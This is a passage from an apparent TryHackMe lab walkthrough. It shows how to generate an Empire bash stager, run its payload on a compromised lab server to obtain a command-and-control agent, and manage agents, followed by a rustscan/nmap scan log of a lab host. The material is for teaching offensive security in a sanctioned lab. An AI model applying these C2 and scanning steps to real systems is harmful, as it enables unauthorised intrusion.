From here we click "Create" and once again select `multi/bash`.
We select the Listener we created in the previous task, then click submit, leaving the other options at their default values:
![Setting the Listener name, then executing the stager](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/15e298c934fb.png)
This brings us back to the stagers main menu where we are given the option to copy the stager to the clipboard by clicking on the "Actions" dropdown and selecting "Copy to Clipboard":
![Highlighting the button allowing us to copy the stager to the clipboard](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/71a9dfe8dffa.png)
Once again we would now have to execute this on the target.
Answer the questions below
Using your choice of Empire CLI or Starkiller, generate a `multi/bash` stager and save it as a file on your own disk.
Question Done
**Bonus Question (Optional):** Read through the code in the script and see if you can decipher what it is doing. You will need to decode the payload from Base64 before doing so.
Completed
### Task 27  Command and Control Empire: Agents
[**Video**](https://youtu.be/T9Pr9pPjdMM)
Now that we've started a listener and created a stager, it's time to put them together to get an agent!
We've been building up towards getting an agent on the compromised webserver, so let's do that now.
---
The process for this is identical whether we are using Starkiller or Empire Client. We need to get the file to the target and executed.
There are a variety of ways we could do this. The simplest would simply be to use your preferred CLI text editor to create a file on the target, copy and paste the script in, then execute it. If using this method, please do it in the /tmp directory and follow the `FILENAME-USERNAME.sh` naming convention. We could also use something called a _[here-document](https://tldp.org/LDP/abs/html/here-docs.html)_ to execute the entire script without ever writing it to the disk.
That said, this is overkill. If we read through the script we can see that it is in three main parts:
![Isolating the shebang, payload, and cleanup aspects of the script via highlighting. Line 1 is the shebang, line 2 is the payload, lines 3 and 4 are the cleanup.](https://assets.tryhackme.com/additional/wreath-network/bed26471fb22.png)
- In the green square we have the _shebang_. This tells the shell which interpreter to run the script under. In this case the script would be run using `/bin/bash`
- The red square contains the payload itself. This is the section we're interested in
- The blue square contains post processing commands. Specifically these two lines tell the script to delete itself then exit
Knowing this, we can just copy everything in the red square then execute it in a terminal on the target:
![Demonstration of executing the payload on the target manually by copying the payload from the stager and pasting it into a shell.](https://assets.tryhackme.com/additional/wreath-network/0d056c07dc42.png)
This results in an agent being received by our waiting listener.
In the Empire CLI receiving a listener looks something like this:
![Showing what a received agent looks like in Empire CLI](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/2c40df48c20b.png)
We can then type `agents` and hit enter to see a full list of available agents:
![Using the agents command to view all available agents](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/dd75d7655190.png)
To interact with an agent, we use `interact AGENT_NAME` -- as per usual a dropdown with autocompletes will assist us here. This puts us into the context of the agent. We can view the full list of available commands with `help`:
![Demonstrating how to interact with an agent and use the help menu](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/58e64472c5ae.png)
Note that this menu will change depending on the stager we used.
When we have finished with our agent we use `back` to switch context back to the agents menu. This doesn't destroy the agent, however. If we did want to kill our agent, we would do it with `kill AGENT_NAME`:
![Demonstrating how to exit and kill an agent using the back and kill commands](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/2c32ca6d0224.png)
We can also rename agents using the command: `rename AGENT_NAME NEW_AGENT_NAME`.
---
To interact with agents In Starkiller we go to the Agents tab on the left hand side of the screen:
![Highlighting the agents menu in Starkiller](https://assets.tryhackme.com/additional/wreath-network/f72d55e49b79.png)
Here we will see that our agent has checked in!
![Showing what an agent checking in looks like in the Starkiller GUI](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/52199197fe7a.png)
To interact with an agent in Starkiller we can either click on its name, or click on the "pop out" button in the actions menu.
This results in a menu which gives us access to a variety of amazing features, including the ability to execute modules (more on these soon), execute commands in an interactive shell, browse the file system, and much more. Be sure to play around with this before moving on!
![Showing the popout menu for interacting with the received agent](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/fe886b4ba6bb.png)
To delete agents in Starkiller we can use either the trashcan icon in the pop-out agent Window, or the kill button in the action menu for the agent back in the Agents tab of Starkiller.
Answer the questions below

## Enumeration
[**Video**](https://youtu.be/3ddDBa6tAq0)
**As with any attack, we first begin with the enumeration phase. Completing the [Nmap](https://tryhackme.com/room/furthernmap) room (if you haven't already) will help with this section.**
**Thomas gave us an IP to work with (shown on the Network Panel at the top of the page). Let's start by performing a port scan on the first 15000 ports of this IP.**
_**Note:** Here (and in general), it's a good idea to save your scan results to a file so you don't have to re-run the same scan twice._
Answer the questions below
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.200.84.200 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.200.84.200:22
Open 10.200.84.200:80
Open 10.200.84.200:443
Open 10.200.84.200:10000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.200.84.200 [4 ports]
Discovered open port 22/tcp on 10.200.84.200
Discovered open port 443/tcp on 10.200.84.200
Discovered open port 80/tcp on 10.200.84.200
Discovered open port 10000/tcp on 10.200.84.200
Completed Connect Scan (4 total ports)
Initiating Service scan
Scanning 4 services on 10.200.84.200
Completed Service scan (4 services on 1 host)
NSE: Script scanning 10.200.84.200.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
NSE Timing: About 99.82% done; ETC: 15:00 (0:00:00 remaining)
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.200.84.200
Host is up, received user-set (0.19s latency).

PORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c1bd4b4054d8899ce091fc1156ad47e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfKbbFLiRV9dqsrYQifAghp85qmXpYEHf2g4JJqDKUL316TcAoGj62aamfhx5isIJHtQsA0hVmzD+4pVH4r8ANkuIIRs6j9cnBrLGpjk8xz9+BE1Vvd8lmORGxCqTv+9LgrpB7tcfoEkIOSG7zeY182kOR72igUERpy0JkzxJm2gIGb7Caz1s5/ScHEOhGX8VhNT4clOhDc9dLePRQvRooicIsENqQsLckE0eJB7rTSxemWduL+twySqtwN80a7pRzS7dzR4f6fkhVBAhYflJBW3iZ46zOItZcwT2u0wReCrFzxvDxEOewH7YHFpvOvb+Exuf3W6OuSjCHF64S7iU6z92aINNf+dSROACXbmGnBhTlGaV57brOXzujsWDylivWZ7CVVj1gB6mrNfEpBNE983qZskyVk4eTNT5cUD+3I/IPOz1bOtOWiraZCevFYaQR5AxNmx8sDIgo1z4VcxOMhrczc7RC/s3KWcoIkI2cI5+KUnDtaOfUClXPBCgYE50=
|   256 9355b4d98b70ae8e950dc2b6d20389a4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFccvYHwpGWYUsw9mTk/mEvzyrY4ghhX2D6o3n/upTLFXbhJPV6ls4C8O0wH6TyGq7ClV3XpVa7zevngNoqlwzM=
|   256 f0615a55349bb7b83a46ca7d9fdcfa12 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINLfVtZHSGvCy3JP5GX0Dgzcxz+Y9In0TcQc3vhvMXCP
80/tcp    open  http     syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open  ssl/http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB/localityName=Easingwold/emailAddress=me@thomaswreath.thm
| Issuer: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB/localityName=Easingwold/emailAddress=me@thomaswreath.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| MD5:   22f622a49708528396682ba604b90c8d
| SHA-1: ea7da89a11db3b3324ea48cef7e366fad4e88720
| -----BEGIN CERTIFICATE-----
| MIIELTCCAxWgAwIBAgIUSo8Az+Qvvy7xiRM+kmWL5cRGHrkwDQYJKoZIhvcNAQEL
| BQAwgaUxCzAJBgNVBAYTAkdCMR4wHAYDVQQIDBVFYXN0IFJpZGluZyBZb3Jrc2hp
| cmUxEzARBgNVBAcMCkVhc2luZ3dvbGQxIjAgBgNVBAoMGVRob21hcyBXcmVhdGgg
| RGV2ZWxvcG1lbnQxGTAXBgNVBAMMEHRob21hc3dyZWF0aC50aG0xIjAgBgkqhkiG
| 9w0BCQEWE21lQHRob21hc3dyZWF0aC50aG0wHhcNMjMwNjAzMTgyNDU2WhcNMjQw
| NjAyMTgyNDU2WjCBpTELMAkGA1UEBhMCR0IxHjAcBgNVBAgMFUVhc3QgUmlkaW5n
| IFlvcmtzaGlyZTETMBEGA1UEBwwKRWFzaW5nd29sZDEiMCAGA1UECgwZVGhvbWFz
| IFdyZWF0aCBEZXZlbG9wbWVudDEZMBcGA1UEAwwQdGhvbWFzd3JlYXRoLnRobTEi
| MCAGCSqGSIb3DQEJARYTbWVAdGhvbWFzd3JlYXRoLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBALQz/mY65FtXnKeVJq61d/aaBVZrEtbo2Z0PLL46
| oPq0ofAoHyfZZRdMAa/ne5gjxQeWiHf2yrOIFi/9A5dxto2DN6SXknF2FSUe/Xs+
| BtgOfRtqgayN/E3k2Cm17W0rPY33pdBLom+M4lvDNiNA8OZYT9VKtWG7MWVF612C
| TNFWKQlTodJiMV3EXgut3xyvDoe3uGHj3Wle78en/zDygTopnmwsBnt8RkU3yios
| 6nVFUQ+wXHjckENTI6+PaTwYMH+cDtnNQxoKdhSLugVMUEmIYurIjiQ6cDb/UAq0
| 3vjmPuS06Uflmd5tDt3zcj7RvT07Veloxrb6cAI9H5sMiakCAwEAAaNTMFEwHQYD
| VR0OBBYEFONYRjW8RzDtxeKXV6Fj09zEiak1MB8GA1UdIwQYMBaAFONYRjW8RzDt
| xeKXV6Fj09zEiak1MA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AEamWRP1kceWE5BmR5+YfMXKEmJHpAxh3TclYgSECaL+jldy2TCK5+ulLCi46HbO
| pG9osQbTm/ume6KNHSqmQVnWXHScy030i23YytR+2EY/J1ZYvfnf3UiEy2zkjjvR
| OVALnz/wQ/qhzIMTtkDM4XPzJtO2PByWs/GMrNjP/irqUNETAmji0pZfECGBi0uR
| hFoUpwEQ/QuDIJRj7OY3FJDjYZ6W489G4lLNHKHkEl/pz3jOKxdIKSRye1ccD7Pr
| oDmCEBSdpD7XXqDk+yJuLb320brNWDZ7aUGBj8nXK/9bINDLPICF4ST6i5Ngrfa+
| pRgo2vLIsI0wMjya10UVVyI=
|_-----END CERTIFICATE-----
10000/tcp open  http     syn-ack MiniServ 1.890 (Webmin httpd)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 8E8E99E610C1F8474422D68A4D749607
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

NSE: Script Post-scanning.
